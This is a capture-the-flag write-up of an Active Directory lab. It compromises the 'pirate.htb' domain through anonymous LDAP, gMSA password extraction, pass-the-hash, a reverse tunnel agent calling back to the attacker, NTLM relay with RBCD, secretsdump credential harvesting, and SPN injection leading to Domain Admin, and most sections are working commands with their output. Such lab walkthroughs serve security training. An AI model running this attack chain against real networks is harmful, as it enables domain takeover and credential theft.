02 - Initial Access

Anonymous LDAP → Pre-Windows 2000

What pointed us here Port 389 open on DC01, no credentials yet. Anonymous LDAP bind is the first thing you test when a DC is exposed - it costs nothing and often returns significant AD object data with zero authentication.

With only the initial pentest credential and an open port 389, we started with anonymous LDAP enumeration to understand the domain's object structure. The target was anything unusual - legacy groups, misconfigured accounts, or sensitive attributes exposed to unauthenticated queries.

# Enumerate members of Pre-Windows 2000 Compatible Access group
ldapsearch -x \
    -H ldap://10.129.2.24 \
    -b "DC=pirate,DC=htb" \
    "(memberOf=CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=pirate,DC=htb)" \
    sAMAccountName

The query returned MS01$ as a member of Pre-Windows 2000 Compatible Access - a legacy built-in group that dates to the Windows NT era. When a machine account is added to this group, a known convention applies: the machine's password is set to the lowercase version of the machine name, without the trailing $.

The password convention exists because older NT systems needed to authenticate before they could negotiate a secure channel. Rather than leaving these accounts with no password, Microsoft set them to a predictable default. Nobody removes these accounts from the group when they upgrade.

# Verify the credential
faketime -f '+7h' nxc smb 10.129.2.24 \
    -u 'MS01$' \
    -p 'REDACTED_MACHINE_PASSWORD' \
    --kerberos

# SMB  10.129.2.24  445  DC01  [+] pirate.htb\MS01$:REDACTED_MACHINE_PASSWORD

We now had a foothold in the domain - a machine account with standard domain user privileges. Not spectacular on its own, but enough to query AD objects that require authentication.

03 - Credential Access

gMSA Password Extraction

What pointed us here The two gMSA account names - gMSA_ADCS_prod$ and gMSA_ADFS_prod$ - were visible in LDAP enumeration. gMSA accounts have their passwords stored in AD as the msDS-ManagedPassword attribute, readable only by accounts listed in msDS-GroupMSAMembership. We queried that attribute for MS01$.

Group Managed Service Accounts exist so that services can run under a domain identity without any human managing password rotation. The DC rotates the password automatically, and the password itself is stored in the msDS-ManagedPassword LDAP attribute - but only accounts explicitly listed in PrincipalsAllowedToRetrieveManagedPassword can read it.

# Check who can read gMSA_ADCS_prod$'s password
faketime -f '+7h' bloodyAD \
    -u 'MS01$' -p 'REDACTED_MACHINE_PASSWORD' \
    -d pirate.htb --host DC01.pirate.htb -k \
    get object 'gMSA_ADCS_prod$' \
    --attr msDS-GroupMSAMembership

# Returns: MS01$ is in the allowed list

# Extract the managed password blob
faketime -f '+7h' bloodyAD \
    -u 'MS01$' -p 'REDACTED_MACHINE_PASSWORD' \
    -d pirate.htb --host DC01.pirate.htb -k \
    get object 'gMSA_ADCS_prod$' \
    --attr msDS-ManagedPassword

bloodyAD returned the raw MSDS-MANAGEDPASSWORD_BLOB and automatically parsed it into the current NT hash. We repeated for the second account:

AccountNTLM Hash
gMSA_ADCS_prod$REDACTED_ADCS_NTLM_HASH
gMSA_ADFS_prod$REDACTED_ADFS_NTLM_HASH
Note on gMSA Rotation gMSA passwords rotate on machine reboot. If the hash stops working after a box reset, re-run the extraction with MS01$. The hash in the attribute will have changed, but the extraction process is identical.
04 - Initial Foothold

Pass-the-Hash → Shell on DC01

What pointed us here We had NTLM hashes for two gMSA accounts. The naming convention (_ADCS_prod$, _ADFS_prod$) suggests these accounts run certificate and federation services - roles typically hosted on or near a domain controller. WinRM on DC01 was the obvious first test. 
# Test WinRM with the gMSA hash
nxc winrm 10.129.2.24 \
    -u 'gMSA_ADCS_prod$' \
    -H 'REDACTED_ADCS_NTLM_HASH'

# WINRM  10.129.2.24  5985  DC01  [+] pirate.htb\gMSA_ADCS_prod$ (Pwn3d!)

# Open the shell
evil-winrm -i 10.129.2.24 \
    -u 'gMSA_ADCS_prod$' \
    -H 'REDACTED_ADCS_NTLM_HASH'

Shell as pirate\gmsa_adcs_prod$ on DC01. The first thing we did was enumerate network interfaces - DC01 had two NICs:

*Evil-WinRM* PS> ipconfig /all

Ethernet adapter Ethernet0:
   IPv4 Address: 10.129.2.24       # External - reachable from Kali

Ethernet adapter Ethernet1:
   IPv4 Address: 192.168.100.1     # Internal - unknown network

A quick ping sweep confirmed 192.168.100.2 alive - this was WEB01, sitting on an internal segment with no direct route from Kali. To reach it, we needed a tunnel.

05 - Tunneling

Ligolo-ng - Why Not SOCKS

What pointed us here WEB01 had SMB signing disabled (confirmed via nxc smb). NTLM relay was the intended path. But NTLM relay requires WEB01 to actively connect back to Kali - an inbound connection. SOCKS proxies are unidirectional (Kali → internal), so they cannot carry inbound traffic. Ligolo-ng was the right tool here because it creates a real TUN interface, giving Kali a genuine route into the internal network with bidirectional L3 connectivity. 
# Kali - create the interface and start the proxy server
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# DC01 (via Evil-WinRM) - upload and connect the agent
upload /opt/ligolo/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect 10.10.16.14:11601 -ignore-cert

# Kali - activate the tunnel in the Ligolo console
» session
» start

# Add route so Kali can reach the internal segment directly
sudo ip route add 192.168.100.0/24 dev ligolo

After this, 192.168.100.2 was directly reachable from Kali - no proxychains, no wrapping. Native tools like nmap and impacket worked against WEB01 as if it were on the local network. Critically, WEB01's outbound connections could now route back to Kali - the requirement for the relay attack.

06 - Lateral Movement

NTLM Relay → RBCD → SYSTEM on WEB01

What pointed us here Three conditions pointed directly to NTLM relay + RBCD: (1) nxc smb 192.168.100.2 showed signing:False - SMB signing not enforced, relay possible. (2) We had valid domain credentials to drive the coercion. (3) The Ligolo tunnel gave us true L3 bidirectional connectivity so WEB01 could reach Kali's relay listener.

The logic

If we can coerce WEB01 into authenticating to us as its machine account WEB01$, and we relay that authentication to DC01's LDAP service, we can write into WEB01's msDS-AllowedToActOnBehalfOfOtherIdentity attribute. That attribute is a whitelist - it tells the KDC which accounts are trusted to impersonate any user to WEB01. Once we write our controlled machine account ATTACKER$ into that list, we can use S4U2Proxy to request a Kerberos ticket as Administrator to WEB01's CIFS service.

The write succeeds even though we are not Domain Admins because machine accounts have write access to their own computer object in AD. When we relay WEB01$'s authentication to LDAP, the DC sees a machine modifying its own attributes - a completely legitimate and permitted operation.

Step 1 - Create a controlled machine account

Machine accounts need to be the delegating account because S4U2Proxy requires the requestor to have registered SPNs. Machine accounts get SPNs automatically at creation; user accounts do not.

impacket-addcomputer \
    -computer-name 'ATTACKER$' \
    -computer-pass 'REDACTED_ATTACKER_PASSWORD' \
    -dc-ip 10.129.2.24 \
    'pirate.htb/pentest:p3nt3st2025!&'

[*] Successfully added machine account ATTACKER$ with password REDACTED_ATTACKER_PASSWORD

Step 2 - Start the relay listener

We target plain ldap:// rather than ldaps://. LDAPS with EPA/channel binding will silently reject the relay; plain LDAP does not enforce binding and accepts relayed credentials.

sudo impacket-ntlmrelayx \
    -t ldap://10.129.2.24 \
    --delegate-access \
    --escalate-user 'ATTACKER$' \
    -smb2support \
    --remove-mic

Step 3 - Coerce WEB01 into authenticating to Kali

coercer coerce \
    -u 'pentest' -p 'p3nt3st2025!&' \
    -d pirate.htb \
    -t 192.168.100.2 \
    -l 10.10.16.14 \
    --always-continue

ntlmrelayx intercepted WEB01$'s MS-EFSR authentication attempt, replayed it to DC01's LDAP as WEB01$, and wrote ATTACKER$ into the delegation attribute:

[*] Authenticating against ldap://10.129.2.24 as PIRATE/WEB01$ SUCCEED
[*] Delegation rights modified successfully!
[*] ATTACKER$ can now impersonate users on WEB01$ via S4U2Proxy

Step 4 - S4U2Proxy: impersonate Administrator to WEB01

faketime -f '+7h' impacket-getST \
    -spn 'cifs/WEB01.pirate.htb' \
    -impersonate Administrator \
    -dc-ip 10.129.2.24 \
    'pirate.htb/ATTACKER$:REDACTED_ATTACKER_PASSWORD'

[*] Saved credential to Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

Step 5 - Shell as SYSTEM on WEB01

faketime -f '+7h' bash -c '
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
impacket-psexec -k -no-pass Administrator@WEB01.pirate.htb'

C:\Windows\system32> whoami
nt authority\system
07 - Post-Exploitation

Post-Exploitation & Credential Harvest

From SYSTEM on WEB01, we ran secretsdump to harvest the full credential set. The most valuable finds were not the NTLM hashes but the LSA secrets - plaintext credentials Windows stores for services and auto-login scenarios:

faketime -f '+7h' bash -c '
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
impacket-secretsdump -k -no-pass Administrator@WEB01.pirate.htb'
FindingValueSignificance
LSA DefaultPassword a.white : REDACTED_AWHITE_PASSWORD Plaintext credential - used in Phase 8 to reset a.white_adm
WEB01$ NTLM REDACTED_WEB01_NTLM_HASH Machine account hash
user.txt Located at C:\Users\a.white\Desktop\user.txt User flag

We also ran impacket-findDelegation across the domain, which returned the finding that defined the entire path to Domain Admin:

faketime -f '+7h' impacket-findDelegation \
    -dc-ip 10.129.2.24 \
    'pirate.htb/a.white:REDACTED_AWHITE_PASSWORD'

AccountName   AccountType  DelegationType                   DelegationRightsTo
a.white_adm   Person       Constrained w/ Protocol Trans    http/WEB01.pirate.htb

Protocol Transition - the two most important words in this output. This means a.white_adm can manufacture a Kerberos ticket impersonating any domain user to http/WEB01.pirate.htb, without the real user's involvement. The account is a ticket-forging engine. The problem: it was aimed at WEB01, which we already owned. We needed it aimed at DC01.

BloodHound filled in the remaining two pieces:

  • a.white → ForceChangePassword → a.white_adm - we could reset the admin account's password using our plaintext a.white credential
  • a.white_adm → WriteSPN → DC01$ - the admin account could write to DC01's servicePrincipalName attribute
08 - Privilege Escalation

SPN Injection + Constrained Delegation → Domain Admin

What pointed us here Three findings converged: (1) a.white_adm has Protocol Transition delegation to http/WEB01.pirate.htb. (2) We can take control of a.white_adm via ForceChangePassword. (3) a.white_adm can write to DC01$'s servicePrincipalName. The insight: SPNs are just strings stored in a database. Moving http/WEB01.pirate.htb from WEB01's account to DC01's account makes the KDC encrypt tickets for that SPN with DC01's key - making them valid for DC01.

Why this works

When the KDC issues a Kerberos service ticket, it looks up which account in AD owns the requested SPN and encrypts the ticket using that account's secret key. The account that can decrypt the ticket is therefore determined entirely by which account's servicePrincipalName attribute contains the SPN string - not by the hostname in the string itself.

If we move HTTP/WEB01.pirate.htb from WEB01's account to DC01's account, the KDC will start encrypting tickets for that SPN with DC01's key. A ticket issued for HTTP/WEB01.pirate.htb will cryptographically be a ticket for DC01 - because only DC01 can decrypt it. We then rewrite the service name field in the ticket (which is not covered by the PAC integrity check) from HTTP/WEB01 to cifs/DC01, and present it to DC01 as if we are Administrator.

Step 1 - Reset a.white_adm's password

faketime -f '+7h' bloodyAD \
    -u 'a.white' -p 'REDACTED_AWHITE_PASSWORD' \
    -d pirate.htb --host DC01.pirate.htb -k \
    set password 'a.white_adm' 'REDACTED_AWHITE_ADM_PASSWORD'

[+] Password changed successfully!

Step 2 - Remove the SPN from WEB01

AD enforces forest-wide SPN uniqueness. The same string cannot exist on two accounts simultaneously. We must remove it from WEB01 before adding it to DC01. We have SYSTEM on WEB01, which runs as WEB01$ - and a machine account has permission to modify its own attributes.

# From our SYSTEM shell on WEB01
setspn -D HTTP/WEB01.pirate.htb WEB01
setspn -D HTTP/WEB01 WEB01

Unregistering ServicePrincipalNames for CN=WEB01,OU=Servers,DC=pirate,DC=htb
HTTP/WEB01.pirate.htb
Updated object

Step 3 - Inject the SPN onto DC01

faketime -f '+7h' bloodyAD \
    -u 'a.white_adm' -p 'REDACTED_AWHITE_ADM_PASSWORD' \
    -d pirate.htb --host DC01.pirate.htb -k \
    set object 'DC01$' servicePrincipalName \
    -v 'HTTP/WEB01.pirate.htb'

[+] DC01$'s servicePrincipalName has been updated

The KDC's lookup table has been silently rewritten. The string HTTP/WEB01.pirate.htb now points to DC01. Every ticket issued for that SPN will be encrypted with DC01's key.

Step 4 - Use Protocol Transition + -altservice to get Administrator on DC01

We use a.white_adm's constrained delegation to manufacture a ticket for HTTP/WEB01.pirate.htb impersonating Administrator. The KDC issues it, encrypted with DC01's key. We rewrite the service name to cifs/DC01.pirate.htb using -altservice - this field is outside the PAC's integrity protection.

faketime -f '+7h' bash -c '
impacket-getST \
    -spn "HTTP/WEB01.pirate.htb" \
    -impersonate Administrator \
    -altservice "cifs/DC01.pirate.htb" \
    -dc-ip 10.129.2.24 \
    "pirate.htb/a.white_adm:REDACTED_AWHITE_ADM_PASSWORD"'

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb to cifs/DC01.pirate.htb
[*] Saved credential to Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache

Step 5 - Shell as SYSTEM on DC01

faketime -f '+7h' bash -c '
export KRB5CCNAME=Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
impacket-psexec -k -no-pass Administrator@DC01.pirate.htb'

10 - Lessons

Key Takeaways

ConceptLesson
Pre-Win2000 group Machine accounts in this group have predictable passwords set by convention. Scan for group membership with anonymous LDAP before any auth.
gMSA accounts The managed password is readable LDAP data - not magic. Always check PrincipalsAllowedToRetrieveManagedPassword for any account you compromise.
SOCKS vs L3 tunnel NTLM relay requires inbound connections from the target. SOCKS proxies are unidirectional. Use Ligolo-ng or a VPN-style tunnel when relay is in scope.
SMB signing signing:False is the one condition that makes relay possible. Always check it with nxc smb <target> immediately after discovery.
Protocol Transition This flag on a delegation account is a ticket-forging engine. When you see it in findDelegation output, immediately check: (a) how do I take control of this account, (b) does it have write access to any computer object's SPN.
SPN uniqueness AD enforces forest-wide SPN uniqueness. You must remove an SPN from its current owner before injecting it onto another account. The machine account that owns a SPN is who the KDC encrypts tickets for - not the hostname in the string.
-altservice The sname field in a Kerberos ticket is outside the PAC's integrity check. impacket's -altservice rewrites it post-issuance - allowing a ticket obtained for HTTP to be presented as CIFS without the DC rejecting it.
LSA secrets Always run secretsdump on every box you own. DefaultPassword LSA secrets frequently contain plaintext credentials for auto-login accounts - often the most privileged accounts on the machine.
